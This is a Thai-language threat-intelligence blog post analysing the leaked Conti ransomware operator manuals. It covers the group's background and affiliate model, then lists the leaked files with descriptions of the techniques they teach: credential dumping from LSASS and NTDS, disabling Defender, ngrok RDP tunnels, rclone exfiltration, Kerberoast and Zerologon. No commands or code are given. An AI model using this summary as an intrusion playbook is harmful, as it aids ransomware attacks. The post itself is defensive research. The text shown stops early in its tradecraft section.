---
title: "Conti Leak Analysis"
date: 2021-08-22T00:19:36+07:00
author: "P. Boonyakarn"
description: "วิเคราะห์การเปิดเผยคู่มือสำหรับผู้ปฏิบัติการของกลุ่มมัลแวร์เรียกค่าไถ่ Conti ศึกษาขั้นตอน เทคนิคและพฤติกรรมในการเจาะระบบตั้งแต่เข้าถึงจนถึงติดตั้งมัลแวร์เพื่อเรียกค่าไถ่"
---

ในช่วงไม่กี่สัปดาห์ที่ผ่านมา หนึ่งในผู้ร่วมปฏิบัติการของกลุ่มมัลแวร์เรียกค่าไถ่ Conti ได้มีการนำคู่มือปฏิบัติการซึ่งจะถูกแจกจ่ายให้กับสมาชิกในกลุ่มมาเผยแพร่สู่สาธารณะ การปรากฎของข้อมูลชุดนี้ได้เผยให้เห็นถึงแนวทางในการเจาะระบบเพื่อให้สามารถบรรลุเป้าหมายในสร้างผลตอบแทนด้วยมัลแวร์เรียกค่าไถ่ได้ ข้อมูลชุดนี้ยังยืนยันและเปิดเผยให้เห็นถึงพฤติกรรมและเทคนิคในการเจาะระบบซึ่งบางส่วนยังไม่เคยปรากฎหรือถูกพูดถึงในรายงานการวิเคราะห์ปฏิบัติการของกลุ่ม Conti อีกด้วย

![](https://pandora-artifacts.s3.ap-southeast-1.amazonaws.com/conti-huoZSyuQ5k/01-VYyegkiXwM.jpg)

สำหรับเป้าหมายของเราในบล็อกนี้คือการวิเคราะห์และทำความเข้าใจข้อมูลที่ถูกปล่อยออกมาทั้งเพื่อใช้มันในการทำความเข้าใจแนวคิดของ Conti และใช้มันเพื่อทำความเข้าใจลักษณะและเทคนิคของกลุ่มมัลแวร์เรียกค่าไถ่อื่น ๆ ซึ่งจะนำไปสู่การค้นคว้าแนวทางในการระบุหาและตรวจจับการมีอยู่ของมัลแวร์เรียกค่าไถ่ที่มีประสิทธิภาพมากยิ่งขึ้น เพื่อให้สามารถทำความเข้าใจได้โดยง่าย ผมจะขอแบ่งส่วนของเนื้อหาในบล็อกนี้ออกเป็นหัวข้อตามรายการด้านล่างครับ

- [Background](#1-background) ประวัติของ Conti, ความเกี่ยวข้องกับ Trickbot และ Ryuk และลักษณะของการว่าจ้างผู้ปฏิบัติการแบบ affiliation program
- [Overview](#2-overview) ชุดของข้อมูลที่เกี่ยวข้องกับปฏิบัติการของ Conti และความแตกต่างของข้อมูลในแต่ละชุด
- [Analysis](#3-analysis) การวิเคราะห์ไฟล์ที่ปรากฎในชุดข้อมูล รายละเอียดและคำอธิบายไฟล์
- [Findings](#4-findings) ข้อสังเกตที่น่าสนใจจากข้อมูลที่ปรากฎในไฟล์โดยเชื่อมโยงกับพฤติกรรมของกลุ่ม Conti

# 1. Background

Conti เป็นสายพันธุ์ของมัลแวร์เรียกค่าไถ่และบริการมัลแวร์เรียกค่าไถ่แบบ Ransomware as a Service (RaaS) ที่เกี่ยวข้องอย่างแนบแน่นกับกลุ่มผู้แพร่กระจายมัลแวร์ Trickbot ซึ่งเป็นกลุ่มเดียวกับผู้ที่แพร่กระจายมัลแวร์เรียกค่าไถ่ Ryuk หลักฐานของความเกี่ยวข้องกันอย่างแนบแน่นนี้ปรากฎทั้งในลักษณะของการใช้โครงสร้างการแพร่กระจายของมัลแวร์ Trickbot ที่มีการแพร่กระจายในระบบทั่วโลกอยู่แล้วเพื่อเป็นช่องทางในการติดตั้งและแพร่กระจายมัลแวร์เรียกค่าไถ่ รวมไปถึงความเหมือนของโค้ดมัลแวร์เรียกค่าไถ่ Conti และโค้ดของมัลแวร์เรียกค่าไถ่ Ryuk

มัลแวร์เรียกค่าไถ่ Conti ใช้แนวทางในการเรียกค่าไถ่แบบ double extortion โดยจะมีทั้งการเข้ารหัสข้อมูลในระบบที่ยึดครองเพื่อสร้างเงื่อนไขในการเรียกค่าไถ่ รวมไปถึงมีการนำไฟล์ข้อมูลออกเป็นเงื่อนไขในการข่มขู่เงื่อนไขที่สอง Conti ยังมีการเผยแพร่รายชื่อของเหยื่อบนเว็บไซต์ของกลุ่มเพื่อกดดันให้เหยื่อจ่ายค่าไถ่ด้วย

ในฉากหลังของปฏิบัติการของ Conti การแพร่กระจายและสร้างรายได้จากมัลแวร์เรียกค่าไถ่ถูกจัดการในลักษณะของ affiliation program หรืออาจเรียกได้ว่าการแบ่งส่วนผลประโยชน์ตามหน้าที่ เช่นเดียวกับโมเดล Ransomware as a Service ที่ผู้ที่ต้องการแพร่กระจายมัลแวร์เรียกค่าไถ่สามารถเช่าซื้อโค้ดของมัลแวร์เรียกค่าไถ่ที่พร้อมใช้งานโดยยอมโดนหักผลประโยชน์จากค่าไถ่ที่จะถูกจ่ายให้กับผู้พัฒนา ใน affiliation program ผู้ที่มีส่วนร่วมกับปฏิบัติการทั้งในหน้าที่ของการเจาะระบบ, การพัฒนามัลแวร์, เป็น call center คอยตอบเหยื่อที่ต้องการความช่วยเหลือในกระบวนการโอนเงิน รวมไปถึงให้เช่าเครือข่ายของมัลแวร์เพื่อเป็นช่องทางในการแพร่กระจายต่างจะได้รับเงินตามเปอร์เซ็นต์การมีส่วนร่วม

เราเคยพูดถึงโมเดล "บริษัทของอาชญากรไซเบอร์" ไปแล้วในกรณีศึกษาของกลุ่ม FIN7 ซึ่งสามารถอ่านเพิ่มเติมได้[ที่นี่](https://pandora.sh/posts/fin7-crimeops-a-learning-note/)

การหาแนวร่วมเพื่อเข้ามาเป็นพนักงานในปฏิบัติการของมัลแวร์เรียกค่าไถ่มักปรากฎในลักษณะเดียวกับการประกาศรับสมัครงานในเว็บบอร์ดของเหล่าอาชญากรไซเบอร์ ในกรณีของ Conti การประกาศมีการให้รายละเอียดเพื่อจูงใจด้วยผลประโยชน์ดังนี้

- การันตีรายได้ต่อเดือน เดือนละ 1,500 ดอลลาร์สหรัฐฯ หรือประมาณ 50,000 บาทเป็นขั้นต่ำ
- รายได้ต่อเดือนจะเพิ่มตามจำนวนเหยื่อโดยแบ่งตามเปอร์เซ็นต์การมีส่วนร่วม โดยจะถูกโอนเป็นบิทคอยน์ไปยังผู้ที่เกี่ยวข้องกับปฏิบัติการ
- มีการจ่ายในลักษณะของ paid vacation หรือการลาพักร้อนแบบไม่ถูกหักเงินเดือนตามกฎหมาย
- ทำงานแบบรีโมต 5 วันต่อสัปดาห์ จันทร์-ศุกร์ในช่วงเวลา 15:00 นาฬิกาถึง 1:00 นาฬิกา ไม่ระบุ time zone ชัดเจน
- มีคู่มือให้กับพนักงานใหม่ ทั้งในลักษณะของคู่มือในการโจมตีระบบ เครื่องมือสำหรับโจมตีระบบ และวีดิโอสอนการโจมตีระบบ

[@herrcore จาก Open Analysis Lab ได้ให้ความเห็น](https://www.youtube.com/watch?v=hmaWy9QIC7c)จากการวิเคราะห์ไฟล์ตัวอย่างของมัลแวร์เรียกค่าไถ่ Conti เอาไว้ว่า สำหรับในกรณีของผู้ปฏิบัติการที่ทำหน้าที่ในการเจาะระบบเพื่อเอาโปรแกรมของมัลแวร์เรียกค่าไถ่ไปเริ่มการทำงานนั้น ผู้ปฏิบัติการอาจจะได้รับคำสั่งให้เข้าถึงเป้าหมายผ่าน Cobalt Strike เพื่อดำเนินการทันที ซึ่งอาจหมายถึงว่าผู้ควบคุมมัลแวร์อย่าง Trickbot หรือ BazarLoader ที่ Conti ใช้เป็นช่องทางในการแพร่กระจายอาจมีการเลือกเป้าหมายเอาไว้แล้ว จากนั้นจึงติดตั้ง BEACON ของ Cobalt Strike และโอนถ่ายการเข้าถึงระบบเป้าหมายนั้นไปให้กับผู้ปฏิบัติการต่อ

# 2. Overview

ข้อมูลหรือคู่มือปฏิบัติการของ Conti นั้นถูกระบุว่ามีทั้งหมด 2 ชุด อย่างไรก็ตามจากการตรวจสอบและติดตามข่าวสาร ข่าวที่เกี่ยวข้องกับการปล่อยข้อมูลกลับบ่งชี้ว่าข้อมูลมีทั้งหมด 3 ชุดที่แตกต่างกัน โดยในขณะนี้นั้นมีเพียงข้อมูลจำนวน 2 ชุดที่ถูกปล่อยออกสู่สาธารณะ ส่วนอีกชุดหนึ่งนั้นยังไม่ปรากฎออกมาในสื่อใด ๆ เพื่อให้ง่ายต่อการระบุถึง ผมจะขอแยกชุดข้อมูลทั้ง 3 ชุดนี้ออกตามรายละเอียดดังนี้ครับ

- **ชุด ManualsAndSoftware** ข้อมูลชุดนี้จะอยู่ในลักษณะของไฟล์บีบอัดชื่อ "Manuals for hard worker and software.rar" บางสำเนาของข้อมูลชุดนี้ที่ถูกเผยแพร่ออกมา เช่น สำเนาของกลุ่ม VX Undergraound จะไม่มีไฟล์ CobaltStrike MANUAL_V2.docx อยู่ภายใน รายการของโครงสร้างไฟล์ในข้อมูลชุดนี้สามารถดูได้จาก [1_ManualsAndSoftware.txt](https://github.com/pe3zx/malware/blob/main/Conti/1_ManualsAndSoftware.txt)

![](https://pandora-artifacts.s3.ap-southeast-1.amazonaws.com/conti-huoZSyuQ5k/02-E9Juvn2J07.jpg)

- **ชุด ContiTraining** เป็นชุดข้อมูลที่ซึ่งคาดว่าถูกใช้เพื่อเป็นคู่มือและแหล่งข้อมูลในการฝึกสอนผู้ปฏิบัติการของ Conti ภายในไฟล์ประกอบไปด้วยไฟล์วีดิโอจากคอร์สจาก Pentester Academy, วีดิโอของ Cobalt Strike และวีดิโอที่เกี่ยวข้องกับการใช้งาน Metasploit เป็นต้น ไม่ปรากฎไฟล์หรือข้อมูลที่เกี่ยวข้องกับกลุ่ม Conti โดยตรง รายการของโครงสร้างไฟล์ในข้อมูลชุดนี้สามารถดูได้จาก [2_ContiTraining.txt](https://github.com/pe3zx/malware/blob/main/Conti/2_ContiTraining.txt)

![](https://pandora-artifacts.s3.ap-southeast-1.amazonaws.com/conti-huoZSyuQ5k/03-nMq4XJnfHP.jpg)

- **ชุด Private** รายการของข้อมูลชุดนี้ปรากฎในเว็บบอร์ด [xss.is](http://xss.is) โดยบุคคลซึ่งอ้างว่าเป็นผู้ปล่อยข้อมูลต้นฉบับ ผู้ปล่อยข้อมูลมีการระบุถึงความตั้งใจที่จะไม่ปล่อยข้อมูลชุดนี้ออกสู่สาธารณะ หากเรียงตามลำดับเวลา รายการของข้อมูลชุดนี้ปรากฎเป็นอันดับที่ 2 หลังจากชุด ManualsAndSoftware ทำให้ถูกเข้าใจว่าเป็นชุดข้อมูลที่ 2 อย่างไรก็ตามหลังจากมีการปล่อยข้อมูลในชุด ContiTraining ออกมานั้น ไฟล์หลายไฟล์ซึ่งปรากฎในรูปด้านล่างกลับไม่ปรากฎในข้อมูลชุด ContiTraining ซึ่งถูกระบุว่าเป็นข้อมูลชุดที่ 2 แทน อาทิ ไฟล์สำคัญอย่าง "Binary Conti Ransomware" หรือไฟล์ที่คาดว่าเป็นโค้ดมาโครที่ถูกใช้โดย Conti ด้วยความแตกต่างกันนี้ ข้อมูลตามรายการด้านล่างจึงถูกกำหนดเป็นข้อมูลชุดที่ 3 แทน ณ ขณะนี้

{{< image src="https://pandora-artifacts.s3.ap-southeast-1.amazonaws.com/conti-huoZSyuQ5k/04-4HnChju5fB.png" alt="" position="center" style="border-radius: 8px;" >}}

การวิเคราะห์ข้อมูลในบทความนี้จะพุ่งเป้าไปที่ชุดข้อมูลที่ผู้วิเคราะห์ครอบครองอยู่ คือข้อมูลในชุด ManualsAndSoftware และข้อมูลชุด ContiTraining เท่านั้นครับ

# 3. Analysis

รายละเอียดในส่วนนี้มีเป้าหมายในการอธิบายรายละเอียดของไฟล์ที่ปรากฎในชุดข้อมูลทั้ง 2 รวมไปถึงข้อมูลภายในไฟล์ จุดประสงค์ของข้อมูลภายในไฟล์และรายละเอียดอื่น ๆ ที่จะช่วยให้ผู้อ่านเข้าใจเหตุผลการมีอยู่ของไฟล์ทั้งหมดได้มากขึ้นครับ

เพื่อให้สามารถทำความเข้าใจจุดประสงค์ของไฟล์ได้โดยง่าย รายการของไฟล์จะถูกอธิบายด้วยรูปแบบของ _"ชื่อไฟล์ดั้งเดิม (ชื่อไฟล์ที่ถูกแปลเป็นภาษาอังกฤษ): รายละเอียดของไฟล์"_ โดยในกรณีที่ไฟล์มีชื่อเป็นภาษาอังกฤษอยู่แล้ว ไฟล์ในรายการดังกล่าวจะไม่มีข้อมูลในส่วน _"ชื่อไฟล์ที่ถูกแปลเป็นภาษาอังกฤษ"_ ครับ

## 3.1 ManualsAndSoftware

| File Name | Description |
|---|---|
| 3 # AV.7z | สคริปต์และโปรแกรมที่สามารถใช้เพื่อปิดการทำงานหรือถอนการติดตั้งโปรแกรมป้องกันมัลแวร์ โปรแกรมป้องกันมัลแวร์ที่จะได้รับผลกระทบจากเครื่องมือในชุดไฟล์นี้ ได้แก่ Sophos, Trend Micro และ BitDefender รวมไปถึงโปรแกรมที่ช่วยในการปิดโปรแกรมมัลแวร์อรรถประโยชน์อย่าง PowerTool, PCHunter และ GMER ด้วย                                           |
| ad_users.txt | คู่มือและคำสั่งสำหรับการรวบรวมรายการบัญชีผู้ใช้งานในสภาพแวดล้อม Active Directory ด้วย PowerView และ Invoke-UserHunter             |
| CS4.3_Clean ahsh4veaQu .7z | ไฟล์โปรแกรม Cobalt Strike รุ่น 4.3   |
| DAMP NTDS.txt | คู่มือและคำสั่งสำหรับการนำไฟล์ NTDS ออกจากระบบเป้าหมายด้วยฟีเจอร์ WMIC และ VSS พร้อมคำแนะนำในการบีบอัดและส่งออกไฟล์                |
| domains.txt | รายการชื่อระบบ  |
| enhancement-chain.7z | ปลั๊กอินอรรถประโยชน์สำหรับ Cobalt Strike คาดว่าเกิดจากการรวบรวมปลั๊กอินแบบโอเพนซอร์สที่มีอยู่จากหลายแหล่ง                 |
| Kerber-ATTACK.rar | สคริปต์ Invoke-Kerberoast พร้อมกับคู่มือและตัวอย่างในการใช้งานเพื่อสร้างการโจมตีด้วยเทคนิค Kerberoast                |
| NetScan.txt | คู่มือสำหรับการใช้โปรแกรม NetScan ในการสแกนเครือข่าย       |
| p.bat | สคริปต์ที่นำเข้าข้อมูลจากไฟล์ domains.txt จากนั้นทำการเรียกใช้คำสั่ง `ping` กับทุกระบบ ผลลัพธ์จะถูกเก็บลงในไฟล์ res.txt                     |
| PENTEST SQL.txt | ปรากฎลิงค์ไปยัง[หน้า Wiki ของโครงการ NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL/wiki)    |
| ProxifierPE.zip | โปรแกรม Proxifier PE |
| RDP NGROK.txt | คู่มือการใช้ ngrok ในการสร้าง tunnel กับฟีเจอร์ Remote Desktop ของระบบที่ยึดครอง เพื่อให้ผู้ปฏิบัติการสามารถเข้าควบคุมเครื่องเป้าหมายได้ผ่านโดเมนของ ngrok                          |
| RMM_Client.exe | โปรแกรม remote IT management จากบริษัท Splashtop  |
| Routerscan.7z | โปรแกรม RouterScan |
| RouterScan.txt | คู่มือการใช้โปรแกรม RouterScan ในการสแกนเครือข่ายและสร้างการโจมตีแบบ brute force ด้วย wordlist         |
| SQL DAMP.txt | คู่มือและตัวอย่างของการนำข้อมูลออกจากระบบ MSSQL       |
| Аллиасы для мсф.rar (Alliases for msf.rar) | ลิสต์คำสั่งย่อของโปรแกรม Metasploit Framework     |
| Анонимность для параноиков.txt (Anonymity for the paranoid.txt) | คู่มือสำหรับเพิ่มความเป็นส่วนตัวของผู้ปฏิบัติการ ประกอบไปด้วยคำแนะนำภายใต้แนวคิดของการกลืนไปกับคนหมู่มากแทนการสร้างการป้องกันและตั้งค่าให้ตัวเองโดดเด่นมาจากผู้อื่น เช่น การปิดฟีเจอร์ WebRTC และ JavaScript ของเบราว์เซอร์ รวมไปถึงคำแนะนำให้เลือกใช้ OS อย่าง Debian แทน Kali                                             |
| ДАМП LSASS.txt (Dump LSASS.txt) | คู่มือและตัวอย่างคำสั่งในการดึงสร้างไฟล์ memory dump ของโปรเซส lsass.exe ด้วยการเรียกใช้ฟังก์ชัน `MiniDump` ใน Comsvcs.dll (อ้างอิง [LOLBAS](https://lolbas-project.github.io/lolbas/Libraries/Comsvcs/)) รวมไปถึงเทคนิคทั่วไปอย่างการใช้คำสั่ง `logonpasswords` ของโปรแกรม mimikatz                          |
| Если необходимо отсканить всю сетку одним листом.txt (If you need to scan the entire grid in one sheet..txt) | คู่มือและตัวอย่างคำสั่งของโปรแกรม AdFind       |
| Закреп AnyDesk.txt (Anchored AnyDesk.txt) | สคริปต์ PowerShell สำหรับดาวโหลดและติดตั้งโปรแกรม AnyDesk      |
| Заменяем sorted адфиндера.txt (We replace sorted adfinder.txt) | คู่มือและตัวอย่างคำสั่งในการใช้ฟีเจอร์ Task Scheduler ผ่าน `schtasks.exe` เพื่อให้สามารถเอ็กซีคิวต์โปรแกรมสำหรับเก็บข้อมูลระบบโดยอัตโนมัติตามระยะเวลาที่ต้องการได้                             |
| КАК ДЕЛАТЬ ПИНГ (СЕТИ).txt (HOW TO PING (NETWORK) .txt) | คู่มือในการใช้สคริปต์ p.bat ร่วมกับ domains.txt        |
| КАК ДЕЛАТЬ СОРТЕД СОБРАННОГО АД!!!!.txt (HOW TO MAKE SORT OF COLLECTED HELL !!!!. Txt) | คู่มือและตัวอย่างคำสั่งในการโอนถ่ายไฟล์ออกผ่านโปรโตคอล FTP ด้วยโปรแกรม FileZilla และการใช้ Tor เพื่อให้การเชื่อมต่อเกิดขึ้นผ่านพร็อกซีแบบ SOCKS                        |
| КАК И КАКУЮ ИНФУ КАЧАТЬ.txt (HOW AND WHAT INFO TO DOWNLOAD.txt) | คู่มือและตัวอย่างของการสร้างรายการไฟล์ที่มีระบบด้วย Invoke-ShareFinder จากนั้นใช้โปรแกรม rclone เพื่อรวบรวมไฟล์เพื่อส่งออก                    |
| КАК ПРЫГАТЬ ПО СЕССИЯМ С ПОМОЩЬЮ ПЕЙЛОАД.txt (HOW TO JUMP SESSIONS USING PAYLOAD.txt) | คู่มือและตัวอย่างคำสั่งในการใช้ฟีเจอร์ Task Scheduler ผ่าน `schtasks.exe` เพื่อให้สามารถเอ็กซีคิวต์โปรแกรมสำหรับเก็บข้อมูลระบบโดยอัตโนมัติตามระยะเวลาที่ต้องการได้                             |
| Личная безопасность.txt (Personal Safety.txt) | คู่มือสำหรับเพิ่มความปลอดภัยและความเป็นส่วนตัวให้กับผู้ปฏิบัติการ ประกอบด้วยคำแนะนำให้ผู้ปฏิบัติการดำเนินปฏิบัติการใน virtual machine และใช้โปรแกรม VeraCrypt ในการเข้ารหัสดิสก์ของ virtual machine ด้วย                                  |
| Мануал робота с AD DC.txt (Manual robot with AD DC.txt) | ไฟล์ซึ่งจัดเก็บ log จากโปรแกรม Cobalt Strike แสดงตัวอย่างของการเรียกใช้คำสั่งในปฏิบัติการและผลลัพธ์ที่เกิดจากคำสั่ง คาดว่าถูกใช้เป็นตัวอย่างประกอบเพื่อให้เห็นภาพทั้งหมดของปฏิบัติการ                                    |
| МАНУАЛ.txt (MANUAL.txt) | คู่มือแนะนำเทคนิคในกลุ่ม post exploitation ผ่าน Cobalt Strike ซึ่งรวมไปถึงการรวบรวมข้อมูลของระบบ, การใช้ชุดสคริปต์ PowerView ในการช่วยรวบรวม, การระบุหาข้อมูลสำหรับยืนยันตัวตนในระบบที่ยืดครอง และการปิดฟีเจอร์ป้องกันมัลแวร์ที่มาพร้อมกับระบบปฏิบัติการ                                         |
| Меняем RDP порт.txt (Change RDP port.txt) | สคริปต์ PowerShell สำหรับการเปลี่ยนพอร์ตของเซอร์วิส Remote Desktop        |
| ОТКЛЮЧЕНИЕ ДЕФЕНДЕРА ВРУЧНУЮ.txt (DISABLING THE DEFENDER MANUALLY.txt) | คู่มือและขั้นตอนในการปิดการทำงานเซอร์วิส Windows Defender ผ่านการตั้งค่าใน Group policy            |
| параметр запуска локера на линукс версиях.txt (locker launch parameter on linux versions.txt) | รายการพารามิเตอร์ของโปรแกรมมัลแวร์เรียกค่าไถ่ Conti ในรุ่นที่รองรับการเข้ารหัสระบบปฏิบัติการลินุกซ์และระบบ ESXi                    |
| ПЕРВОНАЧАЛЬНЫЕ ДЕЙСТВИЯ.txt (INITIAL STEPS.txt) | คู่มือแนะนำเทคนิคในกลุ่ม post exploitation ประกอบไปด้วยการโจมตีด้วยเทคนิค Kerberoast, การใช้คำสั่ง `hashdump` ของโปรแกรม Cobalt Strike หรือ `logonpasswords` ของ mimikatz ในการเข้าถึงข้อมูลสำหรับยืนยันตัวตน, การโจมตีด้วยเทคนิค Pass the Hash และพยายามยกระดับสิทธิ์เป็นระบบ, การรวบรวมรายไฟล์และการ lateral movement ผ่านโปรโตคอล SMB โดยการใช้ Metasploit Framework ร่วมกับรหัสผ่านหรือแฮชของรหัสผ่านของบัญชีผู้ใช้งาน                                             |
| по отключению дефендера.txt (to disable defender.txt) | คู่มือการปิดเซอร์วิส mspeng ของ Windows Defender ด้วยโปรแกรม GMER       |
| ПОВИЩЕНИЯ ПРИВИЛЕГИЙ.txt (INCREASE PRIVILEGES.txt) | เก็บลิงค์ไปยังเว็บไซต์ [deepl.com](http://deepl.com/) และโครงการ [S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)      |
| поднятие прав (дефолт).txt (elevation of rights (default) .txt) | คู่มือการใช้คำสั่ง `svc-exe` และ `uac-token -dubl` ของ Cobalt Strike ในการช่วยยกระดับสิทธิ์           |
| Получение доступа к серверу с бекапами Shadow Protect SPX (StorageCraft).txt (Gaining access to the server with backups Shadow Protect SPX (StorageCraft) .txt) | คู่มือการเข้าถึงระบบที่ใช้งานซอฟต์แวร์ Shadow Protect SPX (StorageCraft) รายละเอียดระบุเพียงแต่การเข้าถึงผ่านฟีเจอร์ Remote Desktop ไม่มีการระบุถึงรายละเอียดที่เกี่ยวข้องกับช่องโหว่ของซอฟต์แวร์                                  |
| ПРОСТАВЛЕНИЕ.txt (SPACE.txt) | คู่มือแนะนำการใช้โปรแกรม PsExec ในการเอ็กซีคิวต์คำสั่งและเก็บข้อมูลในระบบอื่น ๆ               |
| Рабочая станция на работу через Tor сетїь.txt (Workstation to work through the Tor network.txt) | ประกอบด้วยคำแนะนำให้ใช้ระบบ Whonix และให้ปฏิบัติตามคำแนะนำที่ปรากฎใน [https://defcon.ru/penetration-testing/405/](https://defcon.ru/penetration-testing/405/) เพื่อความปลอดภัย            |
| Рабочий скрипт создания VPS сервера для тестирования на проникноваение от A до Z.txt (Working script for creating a VPS server for penetration testing from A to Z.txt) | คู่มือการตั้งค่า virtual private server เพื่อการทดสอบเจาะระบบ อ้างอิงไปยังลิงค์ในเว็บบอร์ด [xss.is](http://xss.is) ที่มีข้อมูลโดยละเอียดปรากฎอยู่                       |
| рклон.zip (rclone.zip) | ไฟล์โปรแกรม rclone |
| Сайт создание батникоd.txt (Website creation batnikod.txt) | คู่มือในการใช้เว็บไซต์ online code editor      |
| Скрипт для sorted .rar (Script for sorted .rar) | สคริปต์แบบ shell script สำหรับรวบรวมข้อมูลรายชื่อผู้ใช้งานและระบบที่มีการเชื่อมต่อ                |
| СМБ АВТОБРУТ.txt (SMB AUTOBRUT.txt) | คู่มือและตัวอย่างคำสั่งในการสร้างการโจมตีแบบ brute force ผ่านโปรโตคอล SMB ด้วย Invoke-SMBAutoBrute จาก Cobalt Strike           |
| СНЯТИЕ-AD.rar (REMOVAL-AD.rar) | โปรแกรม AdFind และสคริปต์สำหรับการเรียกใช้โปรแกรม AdFind เพื่อรวบรวมข้อมูล         |
| Список ТГ форумов, много интересного.txt (List of TG forums, many interesting things.txt) | รายการ Telegram channel |
| Установка метасплойт на впс.txt (Installing metasploit on vps.txt) | คู่มือการติดตั้งโปรแกรม Metasploit Framework      |
| хантинг админов, прошу ознакомиться, очень полезно!!.txt (hunting admins, please read, very useful !!. txt) | คู่มือและตัวอย่างคำสั่งเพื่อรวบรวมข้อมูลผู้ใช้งานใน Active Directory ผ่าน Cobalt Strike               |
| Эксплуатация CVE-2020-1472 Zerologon в Cobalt Strike.txt (Exploiting CVE-2020-1472 Zerologon at Cobalt Strike.txt) | คู่มือแสดงขั้นตอนการโจมตีช่องโหว่ ZeroLogon ผ่าน Cobalt Strike         |
| это установка армитажа. ставится поверх Metasploit (this is an armitage installation. put on top of Metasploit) | สคริปต์สำหรับติดตั้งโปรแกรม Armitage      |
| CobaltStrike MANUAL_V2 .docx (Cobalt strike MANUALS_V2 Active Directory) | ขั้นตอนการใช้โปรแกรม Cobalt Strike ในลักษณะ post exploitation ตั้งแต่การรวบรวมข้อมูลของระบบและผู้ใช้งาน, การยกระดับสิทธิ์, การเข้าถึงระบบอื่น ๆ และการรวบรวมไฟล์เพื่อนำออก                       |

## 3.2 ContiTraining

| File Name | Description |
|---|---|
| 1. Кряк 2019.rar (1. Crack 2012.rar) | คู่มือการทำ reverse engineering, ไฟล์โปรแกรมสำหรับการทดสอบ, ตัวอย่างโปรแกรมที่ถูกคอมไพล์แล้วและการใช้โปรแกรม IDA Pro จากเว็บไซต์ exelab               |
| 2. Метасплоит US.rar (2. Metasploit US.rar) | วีดิโอและข้อมูลประกอบจากคอร์ส [SecurityTube Metasploit Framework Expert (SMFE)](http://www.securitytube.net/groups?operation=view&groupId=10)     |
| 3. Метасплоит RU.zip (3. Metasploit RU.zip) | วีดิโอและข้อมูลประกอบจากคอร์ส [Этичный хакинг с Metasploit для начинающих](https://www.udemy.com/course/metasploit/)     |
| 4. Network Pentesting.rar | วีดิโอและข้อมูลประจากคอร์ส [Network Pentesting โดย PentesterAcademy](https://www.pentesteracademy.com/course?id=6)     |
| 5. Cobalt Strike.rar | วีดิโอจากเพลย์ลิสต์ [Red Team Operations with Cobalt Strike โดย Raphael Mudge](https://www.youtube.com/watch?v=q7VQeK533zI&list=PL9HO6M_MU2nfQ4kHSCzAQMqxQxH47d1no) และวีดิโอ [CVE-2020-1472 Zerologon as a Beacon Object File](https://www.youtube.com/watch?v=zGf1Rat3rEk)       |
| 6. Powershell for Pentesters+.rar | วีดิโอและข้อมูลประกอบจากคอร์ส [Powershell for Pentesters โดย PentesterAcademy](https://www.pentesteracademy.com/course?id=21)     |
| 7. Windows Red Team Lab+.rar | วีดิโอและข้อมูลประกอบจากคอร์ส [Windows Red Team Lab โดย PentesterAcademy](https://www.pentesteracademy.com/course?id=21)     |
| 8. WMI Attacks and Defense +.rar | วีดิโอและข้อมูลประกอบจากคอร์ส [WMI Attacks and Defense โดย PentesterAcademy](https://www.pentesteracademy.com/course?id=34)     |
| 9. Abusing SQL Server Trusts in a Windows Domain+.rar | วีดิโอและข้อมูลประกอบจากคอร์ส [Abusing SQL Server Trusts in a Windows Domain โดย PentesterAcademy](https://www.pentesteracademy.com/course?id=35)     |
| 10. Attacking and Defending Active Directory+.rar | วีดิโอและข้อมูลประกอบจากคอร์ส [Attacking and Defending Active Directory โดย PentesterAcademy](https://www.pentesteracademy.com/course?id=47)     |
| GCB.zip | วีดิโอและข้อมูลประกอบจาก Global Central Bank: An Enterprise Cyber Range โดย PentesterAcademy    |
| GeekBrayns Реверс-инжиниринг.rar (GeekBrayns Reverse-engineering.rar) | วีดิโอคอร์ส reverse engineering ภาษารัสเซียโดย Sergey Sychev     |

# 4. Findings

เนื้อหาในส่วนต่อไปนี้จะเป็นการพูดถึงข้อสังเกตทีน่าสนใจซึ่งพบในชุดข้อมูลที่ทำการตรวจสอบ ข้อสังเกตเหล่านี้สะท้อนพฤติกรรมของกลุ่ม Conti ตั้งแต่การเข้าถึงระบบเป้าหมายไปจนถึงการบรรลุจุดประสงค์ในการโจมตีและการวิเคราะห์เพิ่มเติมในประเด็นที่สนใจ

## 4.1 Tradecraft

ลำดับขั้นตอนในการโจมตี ยึดครองและเคลื่อนไหวภายในระบบของ Conti ถูกแบ่งออกเป็น 4 ขั้นตอนใหญ่โดยมีเพียง 3 ขั้นตอนที่รายละเอียดประกอบ โดยภายในขั้นตอนใหญ่แต่ละรายการจะประกอบไปด้วยขั้นตอนย่อยอีกหลายรายการ ผมจะหยิบบางส่วนของขั้นตอนย่อยเหล่านี้ขึ้นมาอธิบายและสรุปประกอบเพื่อเพิ่มรายละเอียดให้กับขั้นตอนใหญ่เหล่านี้ครับ

ขั้นตอนใหญ่ในการโจมตีของ Conti ทั้งหมด 4 รายการมีดังนี้

1. การยกระดับสิทธิ์และเก็บข้อมูลของระบบ
2. อัปโหลดข้อมูลของเหยื่อไปยังระบบภายนอก
3. เริ่มการเอ็กซีคิวต์มัลแวร์เรียกค่าไถ่เพื่อเข้ารหัสระบบเป้าหมาย
4. อื่น ๆ (ไม่มีข้อมูล)

### 4.1.1 Increasing Privileges and Collection Information

> เนื่องจากวิธีการเข้าถึงโดยทั่วไปเพื่อติดตั้งและใช้งานมัลแวร์เรียกค่าไถ่ Conti นั้นมักเกิดขึ้นผ่านมัลแวร์ Trickbot หรือมัลแวร์ BazarLoader โดยจะมีการใช้โปรแกรม Cobalt Strike ในการเข้าควบคุมระบบเป้าหมาย เราขออนุมานว่าผู้ปฏิบัติการจะใช้โปรแกรม Cobalt Strike ในการควบคุมและสั่งการระบบในขั้นตอนที่จะเกิดขึ้นต่อจากนี้ไป

การเก็บข้อมูลของเป้าหมายเกิดขึ้นใน 2 ลักษณะ คือ การเก็บข้อมูลที่ปรากฎในอินเตอร์เน็ตและการเก็บข้อมูลในระบบเป้าหมาย

ในการเก็บข้อมูลที่ปรากฎในอินเตอร์เน็ตนั้น ผู้ปฏิบัติการจะได้ทำการหาข้อมูลรายได้ของเหยื่อโดยการใช้คำค้นหาอย่าง "ชื่อเว็บไซต์" หรือ "ชื่อบริษัท" ร่วมกับคำว่า revenue กับบริการค้นหาออนไลน์ต่าง ๆ

